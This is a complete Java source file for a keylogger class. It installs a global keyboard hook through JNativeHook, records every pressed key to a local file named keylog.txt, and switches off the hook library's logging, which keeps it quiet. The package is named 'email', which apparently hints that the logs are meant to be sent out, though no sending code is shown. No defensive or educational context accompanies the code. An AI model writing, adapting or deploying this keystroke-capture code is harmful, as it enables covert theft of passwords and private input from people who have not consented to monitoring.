package email;

import java.io.BufferedWriter;
import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.OutputStreamWriter;
import java.nio.charset.Charset;
import java.util.logging.Logger;
import org.jnativehook.GlobalScreen;
import org.jnativehook.NativeHookException;
import org.jnativehook.keyboard.NativeKeyEvent;
import org.jnativehook.keyboard.NativeKeyListener;

public class KeyLog implements NativeKeyListener {

  private BufferedWriter writer;
  public boolean isLoging = false;

  public KeyLog() {
    try {
      File file = new File("keylog.txt");
      if (file.exists()) {
        file.delete();
      }

      writer = new BufferedWriter(
        new OutputStreamWriter(
          new FileOutputStream("keylog.txt", true),
          Charset.forName("UTF-8")
        )
      );
    } catch (IOException ex) {
      ex.printStackTrace();
    }
  }

  public void start() {
    try {
      isLoging = true;
      writer = new BufferedWriter(
        new OutputStreamWriter(
          new FileOutputStream("keylog.txt", true),
          Charset.forName("UTF-8")
        )
      );
      GlobalScreen.registerNativeHook();
      GlobalScreen.addNativeKeyListener(this);
      Logger logger = Logger.getLogger(
        GlobalScreen.class.getPackage().getName()
      );
      logger.setLevel(java.util.logging.Level.OFF);
    } catch (Exception e) {}
  }

  public void nativeKeyPressed(NativeKeyEvent e) {
    try {
      if (isLoging) {
        String keyText = NativeKeyEvent.getKeyText(e.getKeyCode());
        writer.write("Key Pressed: " + keyText);
        writer.newLine();
        writer.flush();
      }
    } catch (IOException ex) {
      ex.printStackTrace();
    }
  }

  public void nativeKeyReleased(NativeKeyEvent e) {
    // Handle key released event if needed
  }

  public void nativeKeyTyped(NativeKeyEvent e) {
    // Handle key typed event if needed
  }

  public void stop() {
    try {
      isLoging = false;
      writer.close();
      GlobalScreen.unregisterNativeHook();
    } catch (IOException | NativeHookException ex) {
      ex.printStackTrace();
    }
  }
}
